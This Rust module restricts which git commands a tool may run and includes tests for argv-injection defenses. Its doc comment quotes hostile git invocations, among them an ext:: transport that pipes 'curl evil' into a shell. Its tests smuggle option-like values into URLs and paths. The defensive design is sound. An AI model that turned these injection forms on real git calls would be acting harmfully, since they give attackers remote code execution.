//! The closed set of `git` invocations this crate is allowed to make.
//!
//! This module is where ADR-0005 §10 rule 1 stops being a design note and
//! starts doing work. Every previous `git` call in this crate passed argv this
//! crate wrote — a fixed `["rev-parse", "HEAD"]` and friends. **`clone` is the
//! first invocation where a string the user chose reaches `argv`**, and a
//! user-chosen string reaching `git`'s argument vector is the exact shape of
//! the problem the ADR spent a section on:
//!
//! ```text
//! git clone --upload-pack='sh -c "…"' …
//! git -c core.sshCommand='sh -c "…"' fetch
//! git clone 'ext::sh -c "curl evil|sh"'
//! ```
//!
//! The first two are argv injection and are closed by construction: there is no
//! variant here that accepts a flag, so a caller cannot express them.
//!
//! The third needs a **different kind of rule**, and that is the finding this
//! module produced. Rules 1–3 are all argv-shaped — they decide which flags may
//! appear and what the environment holds. The positional URL slot is by
//! definition the one place that must carry a user string, so no argv filter can
//! ever cover it; `--` protects the value from being read as a flag and does
//! nothing about what it means. That is ADR-0005 §10 **rule 4**, and it lives in
//! [`crate::url`] rather than here, because the store is the first place a URL
//! reaches argv and not the last.
//!
//! ## What "closed" means concretely
//!
//! A [`GitOp`] is a `(program, subcommand)` pair with a fixed positional shape.
//! There is no `program` field, no `args: Vec<String>`, no passthrough and no
//! variadic tail. [`GitOp::argv`] *constructs* the argument vector from the
//! variant; nothing else in the crate builds argv for these subcommands. An
//! invocation the enum has no variant for is unrepresentable rather than
//! rejected — the same technique as the missing `FileOp::Delete`.
//!
//! ## Deviation from ADR-0005 §10, recorded rather than buried
//!
//! The ADR sketches `FileOp::RunCommand` holding one of these, so a subprocess
//! travels inside a [`crate::WritePlan`] and inherits `apply`'s containment.
//! These ops deliberately do **not**. A `WritePlan` carries a project root, and
//! rules 5–6 check every op path against it — including rule 6, which rejects
//! any path with a `.git` component. `git clone` writes `<dest>/.git/**`; that
//! is `git` writing to a directory it owns, in vibe's own data directory,
//! outside any project. Routing it through `apply` would buy nothing (the check
//! is on the op's declared path, not on what the subprocess goes on to write)
//! and would cost either an exception to rule 6 or a weakening of it. Rule 6 is
//! worth exactly as much as its lack of an exception list.
//!
//! So the containment that applies here is rules 1–4 — the closed enum, the
//! categorical argument rejection, the constructed environment, and the URL
//! allowlist — all of which live at the exec layer, which is where they belong.
//! **Only the `WritePlan` routing is bypassed.** Every op here is still built by
//! the closed enum, still has its argv constructed rather than passed through,
//! still runs under `env_clear()` plus the rule 3 allowlist, and still takes a
//! validated [`crate::GitUrl`]. That is the one way this deviation could quietly
//! widen, so it is stated rather than left to be inferred.

use std::path::{Path, PathBuf};

use crate::url::GitUrl;

/// The remote name the store's clone uses. A literal, never configurable —
/// making it configurable would put a second user-chosen string into argv for
/// no benefit.
pub const STORE_REMOTE: &str = "origin";

/// Every `git` invocation this crate may make.
///
/// Each variant is one `(program, subcommand)` pair with a fixed positional
/// shape. Adding an invocation means adding a variant here, in a diff someone
/// reviews, rather than a line buried in a command implementation.
#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub enum GitOp {
    /// `git clone -- <url> <dest>`
    Clone { url: GitUrl, dest: PathBuf },
    /// `git remote get-url origin`
    ///
    /// Not decoration. `Fetch` and `ResetToFetchHead` are the only destructive
    /// things this crate does outside a `WritePlan`, and a misconfigured store
    /// path pointing at one of the user's real repositories would have
    /// `reset --hard` throw their work away. This is how the store proves it is
    /// the store before anything touches it.
    RemoteGetUrl { cwd: PathBuf },
    /// `git fetch --prune origin`
    Fetch { cwd: PathBuf },
    /// `git reset --hard FETCH_HEAD`
    ///
    /// A hard reset rather than a merge or a pull, because the store is a
    /// mirror nobody edits: there is no local work to preserve, and `pull`
    /// would invoke merge machinery (and merge drivers, which are configurable
    /// commands) for a case that can never have a conflict.
    ResetToFetchHead { cwd: PathBuf },
    /// `git rev-parse HEAD`
    RevParseHead { cwd: PathBuf },
    /// `git log -1 --format=%cI` — the store's age, read from metadata already
    /// on disk so freshness reporting needs no network (ADR-0006 §7).
    LastCommitDate { cwd: PathBuf },

    // --- project operations (ADR-0008) -----------------------------------
    /// `git init`
    ///
    /// Deliberately without `-b <name>`: `init.defaultBranch` is the user's
    /// configuration, and overriding it so our own output is easier to write
    /// would be the tool deciding something that is not its business
    /// (ADR-0008 §7).
    Init { cwd: PathBuf },
    /// `git add -- <paths>`
    ///
    /// The `--` is rule 2's separator, and it is load-bearing here rather than
    /// belt-and-braces: these paths are file names derived from a project name
    /// the user chose, so a leading `-` is reachable without anything hostile
    /// happening.
    Add { cwd: PathBuf, paths: Vec<PathBuf> },
    /// `git commit -m <message>`
    ///
    /// `-m` takes its value as a separate argv element, so a message beginning
    /// with `-` is a value and not an option. There is no `--` because `git
    /// commit` would read it as "no pathspecs follow", which is what we mean
    /// anyway but says so by omission.
    Commit { cwd: PathBuf, message: String },
    /// `git remote add <name> -- <url>`
    ///
    /// Takes a validated [`GitUrl`], never a `String`. Rule 4's validator lives
    /// in [`crate::url`] rather than beside the agent store precisely so its
    /// second caller would find it already there; this is that caller.
    RemoteAdd {
        cwd: PathBuf,
        name: String,
        url: GitUrl,
    },
    /// `git symbolic-ref --short HEAD`
    ///
    /// Read rather than assumed. `git init` honours `init.defaultBranch`, so
    /// printing `git push -u origin main` in the finish-the-job message would
    /// be a plausible-looking guess in the one output whose entire purpose is
    /// being correct enough to paste (ADR-0008 §7).
    CurrentBranch { cwd: PathBuf },

    // --- prompt operations (ADR-0010) ------------------------------------
    /// `git --no-pager check-ignore -- <path>`
    ///
    /// Asks git whether its exclusion rules apply to a path. **Asking git
    /// rather than parsing `.gitignore` is the whole design**, because git
    /// honours redirects — `core.excludesFile`, nested `.gitignore` files,
    /// `.git/info/exclude` — that a project may legitimately depend on, and a
    /// parser of our own would be confidently wrong about all of them
    /// (ADR-0010 §8).
    ///
    /// `--no-pager` precedes the subcommand, so this is the first variant
    /// whose `argv[0]` is not its subcommand. See [`GitOp::subcommand`].
    ///
    /// The `--` is rule 2's separator and is load-bearing: `path` is a file
    /// name that may begin with `-`.
    ///
    /// **The status is the answer, so this op's failures are not errors.** Its
    /// only caller is [`crate::ignore_state::check_ignore`], which maps the
    /// whole outcome — including the spawn error that means `git` is absent —
    /// onto a state rather than a `Result`.
    CheckIgnore { cwd: PathBuf, path: PathBuf },
}

/// The 4a enumeration for `git check-ignore`, as constructed config constants.
///
/// **Measured on git 2.54.0.windows.1** by planting a hostile per-user config
/// and pairing it against an empty `HOME` (ADR-0010 §8). Recorded with the
/// version because a list that is complete on 2.54 is silently a mitigation on
/// 2.55, and no reader can tell those two states apart.
///
/// `core.fsmonitor` is **spawned by `git check-ignore`** — the planted config
/// produced `error: cannot spawn vibe-nonexistent-fsmonitor-probe` twice, and
/// the empty one produced nothing. A read-only-looking query is an execution
/// surface, so the key is neutralised.
///
/// **`core.excludesFile` is deliberately absent from this list**, and that is
/// the finding ADR-0005 §4a was amended for. Under the same paired fixture a
/// control file moved from exit `1` to exit `0`, which is the redirect this op
/// exists to honour. Neutralising it would follow 4a's original wording exactly
/// and destroy the answer. The enumeration is therefore two questions — which
/// keys execute something, and which keys *carry the answer* — and only the
/// first set appears here.
///
/// `core.pager` is handled by `--no-pager` in [`GitOp::argv`] rather than here:
/// an argv flag is deterministic, where what an empty `GIT_PAGER` means and how
/// it ranks against `core.pager` is itself unmeasured (ADR-0005 §4a).
///
/// `false` rather than the empty string, for that same reason: `false` is a
/// documented boolean git parses, where an empty value's meaning is one more
/// unmeasured fact. Both were measured to silence the spawn; only one rests on
/// something written down.
const CHECK_IGNORE_CONFIG: &[(&str, &str)] = &[("core.fsmonitor", "false")];

impl GitOp {
    /// The directory `git` runs in, or the parent the clone lands in.
    #[must_use]
    pub fn cwd(&self) -> &Path {
        match self {
            // A clone's destination does not exist yet, so `git` runs in the
            // parent and is handed the destination as an argument.
            GitOp::Clone { dest, .. } => dest.parent().unwrap_or(Path::new(".")),
            GitOp::RemoteGetUrl { cwd }
            | GitOp::Fetch { cwd }
            | GitOp::ResetToFetchHead { cwd }
            | GitOp::RevParseHead { cwd }
            | GitOp::LastCommitDate { cwd }
            | GitOp::Init { cwd }
            | GitOp::Add { cwd, .. }
            | GitOp::Commit { cwd, .. }
            | GitOp::RemoteAdd { cwd, .. }
            | GitOp::CurrentBranch { cwd }
            | GitOp::CheckIgnore { cwd, .. } => cwd,
        }
    }

    /// The subcommand half of rule 1's `(program, subcommand)` pair.
    ///
    /// **Read from a match rather than from `argv()[0]`.** That shortcut held
    /// while every variant's first element was its subcommand, and
    /// [`GitOp::CheckIgnore`] ended it by carrying a constructed global flag —
    /// `--no-pager` — ahead of the subcommand. A pair identified by position
    /// would have silently become `("--no-pager", "check-ignore")` the day that
    /// variant landed, which is the allowlist's key drifting without anyone
    /// editing the allowlist.
    #[must_use]
    pub fn subcommand(&self) -> &'static str {
        match self {
            GitOp::Clone { .. } => "clone",
            GitOp::RemoteGetUrl { .. } | GitOp::RemoteAdd { .. } => "remote",
            GitOp::Fetch { .. } => "fetch",
            GitOp::ResetToFetchHead { .. } => "reset",
            GitOp::RevParseHead { .. } => "rev-parse",
            GitOp::LastCommitDate { .. } => "log",
            GitOp::Init { .. } => "init",
            GitOp::Add { .. } => "add",
            GitOp::Commit { .. } => "commit",
            GitOp::CurrentBranch { .. } => "symbolic-ref",
            GitOp::CheckIgnore { .. } => "check-ignore",
        }
    }

    /// Config keys this invocation neutralises, as `(key, value)` constants.
    ///
    /// These reach `git` through constructed `GIT_CONFIG_KEY_n`/`_VALUE_n`
    /// variables, never through `-c`: rule 2 rejects `-c` categorically, and
    /// rule 3's carve-out already permits constants we construct ourselves,
    /// which is how `GIT_CONFIG_NOSYSTEM=1` is set. Writing this as an
    /// exception to rule 2 is how a rule dies (ADR-0010 §8).
    ///
    /// **Exhaustive on purpose, with no wildcard arm.** ADR-0005 §4a's amended
    /// form found that the config surface is enumerable *per invocation*, not
    /// per program — the list written while adding `git clone` did not cover
    /// `git check-ignore`, and nothing revealed that until the new subcommand
    /// was invoked. A `_ => &[]` arm would let the next variant inherit an
    /// empty answer by default, which is precisely the silent staleness the
    /// amendment installs a trigger against. Here the trigger is `E0004`.
    ///
    /// The empty slices are therefore answers, not gaps — but they are answers
    /// **inherited from each op's own enumeration at the time it was added**,
    /// and those predate the fsmonitor finding. `git add` and `git commit` also
    /// read the index and may well spawn `core.fsmonitor` too; that is recorded
    /// as an observation rather than fixed here, because widening a
    /// neutralisation across call sites this diff did not measure would be
    /// asserting a result nobody produced — and disabling a real fsmonitor
    /// daemon on a large repository has a cost those ops never agreed to pay.
    #[must_use]
    pub fn config_overrides(&self) -> &'static [(&'static str, &'static str)] {
        match self {
            GitOp::CheckIgnore { .. } => CHECK_IGNORE_CONFIG,
            GitOp::Clone { .. }
            | GitOp::RemoteGetUrl { .. }
            | GitOp::Fetch { .. }
            | GitOp::ResetToFetchHead { .. }
            | GitOp::RevParseHead { .. }
            | GitOp::LastCommitDate { .. }
            | GitOp::Init { .. }
            | GitOp::Add { .. }
            | GitOp::Commit { .. }
            | GitOp::RemoteAdd { .. }
            | GitOp::CurrentBranch { .. } => &[],
        }
    }

    /// The argument vector, **constructed** — never assembled from a caller.
    ///
    /// Every flag here is a literal in this function. The only values that come
    /// from outside are the `GitUrl` (validated) and the destination path
    /// (which the config decides, and which `--` separates from the options).
    #[must_use]
    pub fn argv(&self) -> Vec<String> {
        let s = |x: &str| x.to_owned();
        match self {
            GitOp::Clone { url, dest } => vec![
                s("clone"),
                // Rule 2's `--` separator. With it, a URL beginning with `-`
                // cannot be read as an option — and `GitUrl::parse` has already
                // refused to build one, so this is the second of two locks on
                // the same door.
                s("--"),
                url.as_str().to_owned(),
                dest.to_string_lossy().into_owned(),
            ],
            GitOp::RemoteGetUrl { .. } => vec![s("remote"), s("get-url"), s(STORE_REMOTE)],
            GitOp::Fetch { .. } => vec![s("fetch"), s("--prune"), s(STORE_REMOTE)],
            GitOp::ResetToFetchHead { .. } => vec![s("reset"), s("--hard"), s("FETCH_HEAD")],
            GitOp::RevParseHead { .. } => vec![s("rev-parse"), s("HEAD")],
            GitOp::LastCommitDate { .. } => vec![s("log"), s("-1"), s("--format=%cI")],
            GitOp::Init { .. } => vec![s("init")],
            GitOp::Add { paths, .. } => {
                let mut argv = vec![s("add"), s("--")];
                argv.extend(paths.iter().map(|p| p.to_string_lossy().into_owned()));
                argv
            }
            GitOp::Commit { message, .. } => vec![s("commit"), s("-m"), message.clone()],
            GitOp::RemoteAdd { name, url, .. } => vec![
                s("remote"),
                s("add"),
                name.clone(),
                s("--"),
                url.as_str().to_owned(),
            ],
            GitOp::CurrentBranch { .. } => vec![s("symbolic-ref"), s("--short"), s("HEAD")],
            GitOp::CheckIgnore { path, .. } => vec![
                // A git-level flag, so it precedes the subcommand. Constructed
                // here rather than set as `GIT_PAGER=`: deterministic, and it
                // does not need the environment to mean anything in particular
                // (ADR-0005 §4a).
                s("--no-pager"),
                s("check-ignore"),
                s("--"),
                path.to_string_lossy().into_owned(),
            ],
        }
    }

    /// Whether this op reaches the network.
    ///
    /// Drives two things. It selects the longer timeout — a clone is minutes,
    /// where every other `git` call in this crate is budgeted in milliseconds.
    /// And it scopes `SSH_AUTH_SOCK`, which is the same reasoning ADR-0005
    /// §10 rule 3a applies to `GITHUB_TOKEN`: an agent socket is a credential
    /// channel, reachable by anything that can see the variable, so it belongs
    /// in the environment of the two ops that can use it rather than in the
    /// base environment every op inherits.
    #[must_use]
    pub fn needs_network(&self) -> bool {
        matches!(self, GitOp::Clone { .. } | GitOp::Fetch { .. })
    }

    /// Whether this op can consume a `GITHUB_TOKEN`.
    ///
    /// **Always `false`, and that is a finding rather than a stub.** ADR-0005
    /// §10 rule 3a leaves open which ops can actually use the token and notes
    /// that `git` has no concept of `GITHUB_TOKEN` at all — the usual bridges
    /// are a `credential.helper` (blocked by rule 2) or a token in the remote
    /// URL (which `git clone` writes straight into `.git/config`). Neither is
    /// acceptable, so no store op gets a credential, and a private store is
    /// reached over `ssh://` instead. The method exists so that a future op
    /// which *can* use one has an obvious place to say so.
    #[must_use]
    pub fn needs_credential(&self) -> bool {
        false
    }

    /// Whether this op modifies the store's working tree.
    #[must_use]
    pub fn is_destructive(&self) -> bool {
        matches!(
            self,
            GitOp::Clone { .. } | GitOp::Fetch { .. } | GitOp::ResetToFetchHead { .. }
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- argv construction ---------------------------------------------

    #[test]
    fn clone_argv_puts_the_separator_before_the_url() {
        let op = GitOp::Clone {
            url: GitUrl::parse("https://example.com/a.git").unwrap(),
            dest: PathBuf::from("/data/vibe/agents"),
        };
        assert_eq!(
            op.argv(),
            vec![
                "clone",
                "--",
                "https://example.com/a.git",
                "/data/vibe/agents"
            ]
        );
        // The clone runs in the parent, because the destination does not exist.
        assert_eq!(op.cwd(), Path::new("/data/vibe"));
    }

    /// The property that makes the enum a containment boundary rather than a
    /// naming convention: no variant can produce a forbidden argument, because
    /// no variant has anywhere to put one.
    #[test]
    fn no_variant_can_emit_a_forbidden_argument() {
        let ops = vec![
            GitOp::Clone {
                // A URL that would be hostile if it reached an option slot.
                url: GitUrl::parse("https://example.com/--upload-pack.git").unwrap(),
                dest: PathBuf::from("/d/store"),
            },
            GitOp::RemoteGetUrl {
                cwd: PathBuf::from("/d/store"),
            },
            GitOp::Fetch {
                cwd: PathBuf::from("/d/store"),
            },
            GitOp::ResetToFetchHead {
                cwd: PathBuf::from("/d/store"),
            },
            GitOp::RevParseHead {
                cwd: PathBuf::from("/d/store"),
            },
            GitOp::LastCommitDate {
                cwd: PathBuf::from("/d/store"),
            },
            // The project ops, with the values they actually carry: paths this
            // crate constructs, and a fixed message. See
            // `a_forbidden_looking_path_is_refused_even_after_the_separator`
            // for the narrowing this implies.
            GitOp::Init {
                cwd: PathBuf::from("/d/proj"),
            },
            GitOp::Add {
                cwd: PathBuf::from("/d/proj"),
                paths: vec![
                    PathBuf::from(".vibe/project.toml"),
                    PathBuf::from("README.md"),
                ],
            },
            GitOp::Commit {
                cwd: PathBuf::from("/d/proj"),
                message: "Initial commit".to_owned(),
            },
            GitOp::RemoteAdd {
                cwd: PathBuf::from("/d/proj"),
                name: "origin".to_owned(),
                url: GitUrl::parse("https://example.com/--receive-pack.git").unwrap(),
            },
            GitOp::CurrentBranch {
                cwd: PathBuf::from("/d/proj"),
            },
            GitOp::CheckIgnore {
                cwd: PathBuf::from("/d/proj"),
                // A prompt file whose name would be hostile in an option slot.
                path: PathBuf::from(".claude/commands/--upload-pack.md"),
            },
        ];

        for op in &ops {
            let argv = op.argv();
            let refs: Vec<&str> = argv.iter().map(String::as_str).collect();
            crate::exec::assert_argv_is_clean(&refs)
                .unwrap_or_else(|e| panic!("{op:?} produced {argv:?}: {e:?}"));

            // The `(program, subcommand)` pair the allowlist keys on is present
            // and identified by name.
            //
            // **This used to assert `!argv[0].starts_with('-')`**, on the
            // reading that every variant names its subcommand first.
            // `CheckIgnore` ends that: `--no-pager` is a *git*-level flag and
            // has to precede the subcommand. So the invariant moves rather than
            // relaxes — anything ahead of the subcommand must be a global flag
            // this crate constructs, and the list of those is two entries long
            // and enumerated here.
            const ALLOWED_GLOBAL_FLAGS: &[&str] = &["--no-pager"];
            let at = argv
                .iter()
                .position(|a| a == op.subcommand())
                .unwrap_or_else(|| panic!("{op:?} does not name {} in {argv:?}", op.subcommand()));
            for leading in &argv[..at] {
                assert!(
                    ALLOWED_GLOBAL_FLAGS.contains(&leading.as_str()),
                    "{op:?} puts `{leading}` before its subcommand"
                );
            }
        }
    }

    /// The new call site's argv, spelled out, because it is the one variant
    /// whose shape is load-bearing in two directions at once: `--no-pager`
    /// must precede the subcommand to be a git-level flag at all, and `--`
    /// must precede the path so a prompt file named `-n` is a value.
    #[test]
    fn check_ignore_argv_puts_the_pager_flag_first_and_the_separator_before_the_path() {
        let op = GitOp::CheckIgnore {
            cwd: PathBuf::from("/d/proj"),
            path: PathBuf::from(".claude/commands/-n.md"),
        };
        assert_eq!(
            op.argv(),
            vec!["--no-pager", "check-ignore", "--", ".claude/commands/-n.md"]
        );
        assert_eq!(op.subcommand(), "check-ignore");
        assert_eq!(op.cwd(), Path::new("/d/proj"));
        // It reads. Nothing here should ever look like a write or a fetch.
        assert!(!op.is_destructive());
        assert!(!op.needs_network());
        assert!(!op.needs_credential());
    }

    /// The 4a enumeration for this invocation, asserted as a pair.
    ///
    /// Both halves matter and only together: the execution surface is
    /// neutralised, **and** the key that carries the answer is not. A version
    /// of this that only checked the first half would pass just as happily
    /// against an implementation that neutralised `core.excludesFile` too and
    /// returned a confidently wrong answer (ADR-0005 §4a).
    #[test]
    fn check_ignore_neutralises_the_execution_surface_and_not_the_answer() {
        let op = GitOp::CheckIgnore {
            cwd: PathBuf::from("/d/proj"),
            path: PathBuf::from("a.md"),
        };
        let keys: Vec<&str> = op.config_overrides().iter().map(|(k, _)| *k).collect();
        assert_eq!(keys, vec!["core.fsmonitor"]);
        assert_eq!(op.config_overrides()[0].1, "false");

        // The half that is a decision rather than an omission.
        assert!(
            !keys.contains(&"core.excludesFile"),
            "core.excludesFile carries the answer this op exists to ask for; \
             neutralising it follows 4a's original wording and destroys the result"
        );
    }

    /// Every *other* op's enumeration is an answer, not a blank — and the
    /// answer they inherit is "nothing", from the pass that added them.
    ///
    /// Asserted so that widening the neutralisation across call sites becomes a
    /// deliberate edit to a test that says why it was scoped, rather than a
    /// quiet change of behaviour for `clone`, `add` and `commit`.
    #[test]
    fn only_the_new_call_site_carries_config_overrides() {
        let cwd = PathBuf::from("/d/proj");
        for op in [
            GitOp::Init { cwd: cwd.clone() },
            GitOp::Add {
                cwd: cwd.clone(),
                paths: vec![],
            },
            GitOp::Commit {
                cwd: cwd.clone(),
                message: "m".to_owned(),
            },
            GitOp::Fetch { cwd: cwd.clone() },
            GitOp::CurrentBranch { cwd },
        ] {
            assert!(op.config_overrides().is_empty(), "{op:?}");
        }
    }

    /// **A narrowing, chosen rather than stumbled into.**
    ///
    /// Rule 2's categorical rejection scans *every* argument, including those
    /// after `--` where option parsing can no longer reach them. So a file
    /// genuinely named `--exec-path=x` is refused even though `--` would have
    /// made it safe.
    ///
    /// Keeping the check un-`--`-aware is the conservative direction and it is
    /// deliberate: rule 2 exists to catch a value landing in a slot that turns
    /// out to be flag-parsed, and teaching it to trust a `--` it can see would
    /// mean trusting the very placement it is there to double-check.
    ///
    /// The cost is currently zero, because `Add` is only ever handed paths this
    /// crate constructs. If a caller ever needs to add arbitrary user paths,
    /// this check has to become separator-aware — and that is a deliberate
    /// change with its own reasoning, not a quiet loosening.
    #[test]
    fn a_forbidden_looking_path_is_refused_even_after_the_separator() {
        let op = GitOp::Add {
            cwd: PathBuf::from("/d/proj"),
            paths: vec![PathBuf::from("--exec-path=/tmp/evil")],
        };
        let argv = op.argv();
        // The separator IS emitted, so this is not the enum failing to protect
        // the slot - it is the runtime check declining to rely on that.
        assert_eq!(argv[1], "--");
        let refs: Vec<&str> = argv.iter().map(String::as_str).collect();
        assert!(
            crate::exec::assert_argv_is_clean(&refs).is_err(),
            "the conservative direction was silently loosened"
        );
    }

    /// An ordinary flag-shaped value — one that is not on the forbidden list —
    /// must still travel as a value rather than being rejected. A project
    /// legitimately named `-thing` is not an attack, and refusing it would
    /// confuse a containment rule for a validation rule.
    #[test]
    fn a_flag_shaped_value_is_carried_as_a_value_not_dropped() {
        let add = GitOp::Add {
            cwd: PathBuf::from("/d/proj"),
            paths: vec![PathBuf::from("-weird-name.md")],
        };
        assert_eq!(add.argv(), vec!["add", "--", "-weird-name.md"]);

        let commit = GitOp::Commit {
            cwd: PathBuf::from("/d/proj"),
            message: "-m looks like a flag".to_owned(),
        };
        // `-m` takes its value as the next argv element, so the message is
        // never option-parsed however it starts.
        assert_eq!(commit.argv(), vec!["commit", "-m", "-m looks like a flag"]);
        let commit_argv = commit.argv();
        let refs: Vec<&str> = commit_argv.iter().map(String::as_str).collect();
        assert!(crate::exec::assert_argv_is_clean(&refs).is_ok());

        let remote = GitOp::RemoteAdd {
            cwd: PathBuf::from("/d/proj"),
            name: "origin".to_owned(),
            url: GitUrl::parse("git@github.com:you/p.git").unwrap(),
        };
        let argv = remote.argv();
        let sep = argv.iter().position(|a| a == "--").expect("separator");
        let url = argv.iter().position(|a| a.contains("github")).unwrap();
        assert!(sep < url, "the separator must precede the URL: {argv:?}");
    }

    /// `Push` is absent, and its absence is load-bearing. The only path that
    /// pushes is the one where `gh` owns authentication and does it itself, so
    /// a `GitOp::Push` would be an op with no legitimate caller — and an op
    /// with no caller is an execution primitive kept warm for whoever finds it
    /// next (ADR-0008 §1).
    #[test]
    fn no_variant_pushes() {
        let cwd = PathBuf::from("/d/proj");
        let every = [
            GitOp::Init { cwd: cwd.clone() },
            GitOp::Add {
                cwd: cwd.clone(),
                paths: vec![],
            },
            GitOp::Commit {
                cwd: cwd.clone(),
                message: "m".to_owned(),
            },
            GitOp::RemoteAdd {
                cwd: cwd.clone(),
                name: "origin".to_owned(),
                url: GitUrl::parse("https://e.example/a").unwrap(),
            },
            GitOp::CurrentBranch { cwd: cwd.clone() },
            GitOp::Fetch { cwd: cwd.clone() },
            GitOp::RevParseHead { cwd },
        ];
        for op in &every {
            assert_ne!(op.argv()[0], "push", "{op:?}");
        }
    }

    #[test]
    fn only_the_network_ops_ask_for_the_network() {
        let cwd = PathBuf::from("/d/store");
        assert!(
            GitOp::Clone {
                url: GitUrl::parse("https://e.example/a").unwrap(),
                dest: cwd.clone(),
            }
            .needs_network()
        );
        assert!(GitOp::Fetch { cwd: cwd.clone() }.needs_network());
        for offline in [
            GitOp::RemoteGetUrl { cwd: cwd.clone() },
            GitOp::ResetToFetchHead { cwd: cwd.clone() },
            GitOp::RevParseHead { cwd: cwd.clone() },
            GitOp::LastCommitDate { cwd },
        ] {
            assert!(
                !offline.needs_network(),
                "{offline:?} should not reach the network"
            );
        }
    }

    #[test]
    fn no_store_op_carries_a_credential() {
        // Stated as a test because the ADR leaves it open and the honest answer
        // is "none of them". If a future op needs one, this fails and someone
        // has to decide deliberately.
        let cwd = PathBuf::from("/d/store");
        for op in [
            GitOp::Clone {
                url: GitUrl::parse("https://e.example/a").unwrap(),
                dest: cwd.clone(),
            },
            GitOp::Fetch { cwd: cwd.clone() },
            GitOp::RevParseHead { cwd },
        ] {
            assert!(!op.needs_credential(), "{op:?}");
        }
    }
}
